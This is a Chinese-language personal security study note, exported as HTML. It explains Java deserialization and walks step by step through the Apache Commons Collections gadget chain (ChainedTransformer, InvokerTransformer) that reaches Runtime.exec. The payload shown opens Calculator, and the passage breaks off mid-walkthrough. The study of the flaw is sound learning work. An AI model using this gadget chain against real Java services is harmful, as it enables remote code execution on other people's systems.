
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <!-- common.css -->
      <style>* {-webkit-tap-highlight-color: rgba(0,0,0,0);}html {-webkit-text-size-adjust: none;}body {font-family: -apple-system, Helvetica, Arial, sans-serif;margin: 0;padding: 20px;color: #333;word-wrap: break-word;}h1, h2, h3, h4, h5, h6 {line-height: 1.1;}img {max-width: 100% !important;height: auto;}blockquote {margin: 0;padding: 0 15px;color: #777;border-left: 4px solid #ddd;}hr {background-color: #ddd;border: 0;height: 1px;margin: 15px 0;}code {font-family: Menlo, Consolas, 'Ubuntu Mono', Monaco, 'source-code-pro', monospace;line-height: 1.4;margin: 0;padding: 0.2em 0;font-size: 90%;background-color: rgba(0,0,0,0.04);border-radius: 3px;}pre > code {margin: 0;padding: 0;font-size: 100%;word-break: normal;background: transparent;border: 0;}ol {list-style-type: decimal;}ol ol, ul ol {list-style-type: lower-latin;}ol ol ol, ul ol ol, ul ul ol, ol ul ol {list-style-type: lower-roman;}table {border-spacing: 0;border-collapse: collapse;margin-top: 0;margin-bottom: 16px;}table th {font-weight: bold;}table th, table td {padding: 6px 13px;border: 1px solid #ddd;}table tr {border-top: 1px solid #ccc;}table tr:nth-child(even) {background-color: #f8f8f8;}input[type="checkbox"] {cursor: default;margin-right: 0.5em;font-size: 13px;}.task-list-item {list-style-type: none;}.task-list-item+.task-list-item {margin-top: 3px;}.task-list-item input {float: left;margin: 0.3em 1em 0.25em -1.6em;vertical-align: middle;}#tag-field {margin: 8px 2px 10px;}#tag-field .tag {display: inline-block;background: #cadff3;border-radius: 4px;padding: 1px 8px;color: black;font-size: 12px;margin-right: 10px;line-height: 1.4;}</style>
      <!-- ace-static.css -->
      <style>.ace_static_highlight {white-space: pre-wrap;}.ace_static_highlight .ace_gutter {width: 2em;text-align: right;padding: 0 3px 0 0;margin-right: 3px;}.ace_static_highlight.ace_show_gutter > .ace_line {padding-left: 2.6em;}.ace_static_highlight .ace_line {position: relative;}.ace_static_highlight .ace_gutter-cell {-moz-user-select: -moz-none;-khtml-user-select: none;-webkit-user-select: none;user-select: none;top: 0;bottom: 0;left: 0;position: absolute;}.ace_static_highlight .ace_gutter-cell:before {content: counter(ace_line, decimal);counter-increment: ace_line;}.ace_static_highlight {counter-reset: ace_line;}</style>
      <style>.ace-tomorrow-night-eighties .ace_gutter {background: #272727;color: #CCC}.ace-tomorrow-night-eighties .ace_print-margin {width: 1px;background: #272727}.ace-tomorrow-night-eighties {background-color: #2D2D2D;color: #CCCCCC}.ace-tomorrow-night-eighties .ace_constant.ace_other,.ace-tomorrow-night-eighties .ace_cursor {color: #CCCCCC}.ace-tomorrow-night-eighties .ace_marker-layer .ace_selection {background: #515151}.ace-tomorrow-night-eighties.ace_multiselect .ace_selection.ace_start {box-shadow: 0 0 3px 0px #2D2D2D;}.ace-tomorrow-night-eighties .ace_marker-layer .ace_step {background: rgb(102, 82, 0)}.ace-tomorrow-night-eighties .ace_marker-layer .ace_bracket {margin: -1px 0 0 -1px;border: 1px solid #6A6A6A}.ace-tomorrow-night-bright .ace_stack {background: rgb(66, 90, 44)}.ace-tomorrow-night-eighties .ace_marker-layer .ace_active-line {background: #393939}.ace-tomorrow-night-eighties .ace_gutter-active-line {background-color: #393939}.ace-tomorrow-night-eighties .ace_marker-layer .ace_selected-word {border: 1px solid #515151}.ace-tomorrow-night-eighties .ace_invisible {color: #6A6A6A}.ace-tomorrow-night-eighties .ace_keyword,.ace-tomorrow-night-eighties .ace_meta,.ace-tomorrow-night-eighties .ace_storage,.ace-tomorrow-night-eighties .ace_storage.ace_type,.ace-tomorrow-night-eighties .ace_support.ace_type {color: #CC99CC}.ace-tomorrow-night-eighties .ace_keyword.ace_operator {color: #66CCCC}.ace-tomorrow-night-eighties .ace_constant.ace_character,.ace-tomorrow-night-eighties .ace_constant.ace_language,.ace-tomorrow-night-eighties .ace_constant.ace_numeric,.ace-tomorrow-night-eighties .ace_keyword.ace_other.ace_unit,.ace-tomorrow-night-eighties .ace_support.ace_constant,.ace-tomorrow-night-eighties .ace_variable.ace_parameter {color: #F99157}.ace-tomorrow-night-eighties .ace_invalid {color: #CDCDCD;background-color: #F2777A}.ace-tomorrow-night-eighties .ace_invalid.ace_deprecated {color: #CDCDCD;background-color: #CC99CC}.ace-tomorrow-night-eighties .ace_fold {background-color: #6699CC;border-color: #CCCCCC}.ace-tomorrow-night-eighties .ace_entity.ace_name.ace_function,.ace-tomorrow-night-eighties .ace_support.ace_function,.ace-tomorrow-night-eighties .ace_variable {color: #6699CC}.ace-tomorrow-night-eighties .ace_support.ace_class,.ace-tomorrow-night-eighties .ace_support.ace_type {color: #FFCC66}.ace-tomorrow-night-eighties .ace_heading,.ace-tomorrow-night-eighties .ace_markup.ace_heading,.ace-tomorrow-night-eighties .ace_string {color: #99CC99}.ace-tomorrow-night-eighties .ace_comment {color: #999999}.ace-tomorrow-night-eighties .ace_entity.ace_name.ace_tag,.ace-tomorrow-night-eighties .ace_entity.ace_other.ace_attribute-name,.ace-tomorrow-night-eighties .ace_meta.ace_tag,.ace-tomorrow-night-eighties .ace_variable {color: #F2777A}.ace-tomorrow-night-eighties .ace_indent-guide {background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAACCAYAAACZgbYnAAAAEklEQVQImWPQ09NrYAgMjP4PAAtGAwchHMyAAAAAAElFTkSuQmCC) right repeat-y}</style>
      <!-- export.css -->
      <style>
        body{margin:0 auto;max-width:800px;line-height:1.4}
        #nav{margin:5px 0 10px;font-size:15px}
        #titlearea{border-bottom:1px solid #ccc;font-size:17px;padding:10px 0;}
        #contentarea{font-size:15px;margin:16px 0}
        .cell{outline:0;min-height:20px;margin:5px 0;padding:5px 0;}
        .code-cell{font-family:Menlo,Consolas,'Ubuntu Mono',Monaco,'source-code-pro',monospace;font-size:12px;}
        .latex-cell{white-space:pre-wrap;}
      </style>
      <!-- User CSS -->
      <style> .text-cell {font-size: 15px;}.code-cell {font-size: 12px;}.markdown-cell {font-size: 15px;}.latex-cell {font-size: 15px;}</style>
    </head>
    <body>
      
      <div id="titlearea">
        <h2>大土豆安全笔记 | 2020.03.27</h2>
      </div>
      <div id="contentarea"><div class="cell markdown-cell"><p><img src="resources/16AEED79C32BCE810BF1AABACAB36703.jpg" alt="irene-strong-A6XhSbJuLXk-unsplash.jpg" width="5472" height="3648"></p>
<p><strong>有时候世界真的是个圈，皂滑弄人</strong></p>
<p>前段时间我在写一个逆向辅助工具，1.0版本已经完成了，把自己的手动工作大部分变成了自动化，写完1.0之后，我停下来了一段时间，主要是思考下一版本需要做什么，以及代码结构，我不想写了一大堆之后又要推倒重构</p>
<p>我不是说这两天开始系统的学习Java开发嘛，接触了一些很好用的IDEA插件，比如Lombok，简直就是Java Bean神器，用注解的方式来大量节约<code>set/get</code>代码，贼棒，刚好就可以用上了</p>
<p>Java反序列化相关漏洞学习推荐一篇文章《深入理解Java反序列化漏洞》，写的相当好，很多大佬技术能弄的很透彻，但是写起文章来我是真的不敢恭维，能把技术研究透，又能有条理的描述清楚细节，是真的厉害</p>
<ul>
<li><a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></li>
</ul>
<p>这篇文章里提到了一篇更原始的文章《What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.》</p>
<ul>
<li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li>
</ul>
<p>这里说一句题外话：我之所以保持写安全笔记纯粹是为了个人，我想看看自己是不是真正的掌握了这几天学习的技术，能把一个技术点描述到让自己满意，我觉得就是初步掌握了</p>
<p>Java序列化是指将对象转换为字节流的形式，Java反序列化是指将字节流转换为对象的形式</p>
<p>比如将对象存储在本地文件里，或者进行网络传输，此时就可以使用Java序列化，当需要读取对象数据或者网络另一方收到数据的时候，此时进行Java反序列化，将字节流转换为Java对象，再进行下一步对象操作</p>
<p>简单来看个例子，定义一个<code>ClassSerial</code>类，先对其进行序列化，并写入文件<code>"SerialBug"</code>，完成后进行文本读取，同时反序列化为<code>ClassSerial</code>类型，此过程中我们自定义了方法<code>readObject()</code>，除了正常执行之外，我们额外弹出一个计算器，在反序列化过程中，会自动调用这个方法，第三方开发者可以在这里对其进行做一些自定义的操作，可以理解为Android应用的<code>Application</code>里的方法<code>attachBaseContext()</code>，如果我们重写这个方法可以在<code>onCreate()</code>之前做一些更早的操作</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>public class SerialBug {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    public static void main(String[] args) throws Exception {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    // <span class="ace_cjk" style="width:NaNpx">序</span><span class="ace_cjk" style="width:NaNpx">列</span><span class="ace_cjk" style="width:NaNpx">化</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    ClassSerial classSerial = new ClassSerial();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File("SerialBug")));
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    objectOutputStream.writeObject(classSerial);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    objectOutputStream.close();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    // <span class="ace_cjk" style="width:NaNpx">反</span><span class="ace_cjk" style="width:NaNpx">序</span><span class="ace_cjk" style="width:NaNpx">列</span><span class="ace_cjk" style="width:NaNpx">化</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(new File("SerialBug")));
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    ClassSerial classSerialAfterSerialized = (ClassSerial) objectInputStream.readObject();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    objectInputStream.close();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>class ClassSerial implements Serializable {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    private int fieldInt;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    private String fieldString;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    private void readObject(ObjectInputStream objectInputStream) throws Exception {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    objectInputStream.defaultReadObject();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>运行起来可以看到弹出了计算器，这好像是我这几个月以来弹的最轻松的一个计算器</p>
<p><img src="resources/80228581DB0799B1CD1497B06AA673E8.jpg" alt="IMAGE" width="1679" height="1025"></p>
<p>序列化数据头部特征很有趣：<code>aced 0005</code></p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>➜  SerialBug xxd SerialBug
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>00000000: aced 0005 7372 000b 436c 6173 7353 6572  ....sr..ClassSer
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>00000010: 6961 6cac 22a6 e515 61b5 0f02 0002 4900  ial."...a.....I.
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>00000020: 0866 6965 6c64 496e 744c 000b 6669 656c  .fieldIntL..fiel
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>00000030: 6453 7472 696e 6774 0012 4c6a 6176 612f  dStringt..Ljava/
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>00000040: 6c61 6e67 2f53 7472 696e 673b 7870 0000  lang/String;xp..
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>00000050: 0000 70                                  ..p
</div></div></div></pre>
<p>由于我也只是刚接触，所以不敢对这部分有过多的结论性描述，我目前对于Java反序列化漏洞的理解是：在反序列化用户可控数据的过程中，自定义方法<code>readObject()</code>存在某些代码导致可以进行逻辑上的利用</p>
<p>历史上的Java反序列化漏洞非常多，很多文章也描述的很棒，我这里就不过多的去重复写了，分享我对于Apache Commons Collections库反序列化漏洞的理解</p>
<p>大佬的文章提到了Apache-Commons-Collections库版本</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>root@us-l-breens:/opt/apache-tomcat-8.0.28# grep -Rl InvokerTransformer .
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>./webapps/ROOT/WEB-INF/lib/commons-collections-3.2.1.jar
</div></div></div></pre>
<p>存在漏洞的二进制文件可以从这里下载</p>
<ul>
<li><a href="http://archive.apache.org/dist/commons/collections/binaries/">http://archive.apache.org/dist/commons/collections/binaries/</a></li>
</ul>
<p>很多关于Java反序列化的文章里会写利用ChainedTransformer来执行代码，但是这个特性在代码层面是如何表现的呢？</p>
<p>通过逆向，我们可以看到接口<code>Transformer</code>定义了一个方法<code>transform()</code></p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>public interface Transformer {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    /**
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span> * Transforms the input object (leaving it unchanged) into some output object.
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span> *
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span> * @param input  the object to be transformed, should be left unchanged
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span> * @return a transformed object
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span> * @throws ClassCastException (runtime) if the input is the wrong class
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span> * @throws IllegalArgumentException (runtime) if the input is invalid
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span> * @throws FunctorException (runtime) if the transform cannot be completed
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span> */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    public Object transform(Object input);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>POC代码中一共使用到三个实现类</p>
<ol>
<li>ChainedTransformer</li>
<li>ConstantTransformer</li>
<li>InvokerTransformer</li>
</ol>
<p>关键的一段构造</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Transformer[] transformers = new Transformer[] {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    new ConstantTransformer(Runtime.class),
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /System/Applications/Calculator.app" }) };
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Transformer transformerChain = new ChainedTransformer(transformers);
</div></div></div></pre>
<p>实现类<code>ChainedTransformer</code>，对内部的Transformer一个个进行调用方法<code>transform()</code></p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>public class ChainedTransformer implements Transformer, Serializable {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    public Object transform(Object object) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    for (int i = 0; i &lt; iTransformers.length; i++) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    object = iTransformers[i].transform(object);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    return object;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>实现类<code>ConstantTransformer</code></p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>public class ConstantTransformer implements Transformer, Serializable {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    public ConstantTransformer(Object constantToReturn) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    super();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    iConstant = constantToReturn;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    public Object transform(Object input) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    return iConstant;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>实现类<code>InvokerTransformer</code>，通过反射对我们传入的参数进行方法调用操作，方法名<code>methodName</code>，参数类型<code>paramTypes</code>，参数<code>args</code></p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>public class InvokerTransformer implements Transformer, Serializable {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    super();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    iMethodName = methodName;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    iParamTypes = paramTypes;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    iArgs = args;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    public Object transform(Object input) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    if (input == null) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    return null;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    try {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    Class cls = input.getClass();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    Method method = cls.getMethod(iMethodName, iParamTypes);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    return method.invoke(input, iArgs);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    } catch (NoSuchMethodException ex) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>抛开触发过程，我们结合三个实现类来走一遍执行流程，方法<code>ChainedTransformer.transform()</code>会循环调用<code>Transformer</code>数组里的元素，这里的长度是4，也就是会跑4次</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>public Object transform(Object object) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    for (int i = 0; i &lt; iTransformers.length; i++) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    object = iTransformers[i].transform(object);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    return object;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>第一次执行，返回的是对象<code>Runtime</code>，传入的数据是什么无须在意，因为它不处理传入的数据</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>new ConstantTransformer(Runtime.class)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>public Object transform(Object input) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    return iConstant;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>第一次执行结束后，变量<code>object</code>为<code>class java.lang.Runtime</code></p>
<p><img src="resources/6D8FC6E80D0B7ACD322162A2070E3D33.jpg" alt="IMAGE" width="1680" height="1050"></p>
<p>第二次执行，因为传入的是Object类型，所以需要先使用<code>getMethod()</code>来获取方法<code>getRuntime()</code></p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>new InvokerTransformer(
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    "getMethod", 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    new Class[] { String.class, Class[].class }, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    new Object[] { "getRuntime", new Class[0] }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Object object = Runtime.class;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Class cls = object.getClass();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Method method = cls.getMethod("getMethod", new Class[] { String.class, Class[].class });
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>method.invoke(object, new Object[] { "getRuntime", new Class[0] });
</div></div></div></pre>
<p>第二次执行结束后，变量<code>object</code>为<code>public static java.lang.Runtime java.lang.Runtime.getRuntime()</code></p>
<p><img src="resources/4D0832625A3081007BAC280086CC5C70.jpg" alt="IMAGE" width="1680" height="1050"></p>
<p>第三次执行，我们现在拥有了方法<code>getRuntime()</code>，自然是使用<code>invoke()</code>执行</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>new InvokerTransformer(
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    "invoke",
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    new Class[] { Object.class, Object[].class }, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    new Object[] { null, new Object[0] }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Class cls = object.getClass();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Method method = cls.getMethod("invoke", new Class[] { Object.class, Object[].class });
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>method.invoke(object, new Object[] { null, new Object[0] });
</div></div></div></pre>
<p>第三次执行结束后，变量<code>object</code>为对象<code>Runtime</code></p>
<p><img src="resources/80C6419CC4F4711CAEEE88A5C3547F6F.jpg" alt="IMAGE" width="1680" height="1050"></p>
<p>第四次执行，我们调用对象<code>Runtime</code>的方法<code>exec()</code>，此处发生代码执行</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>new InvokerTransformer(
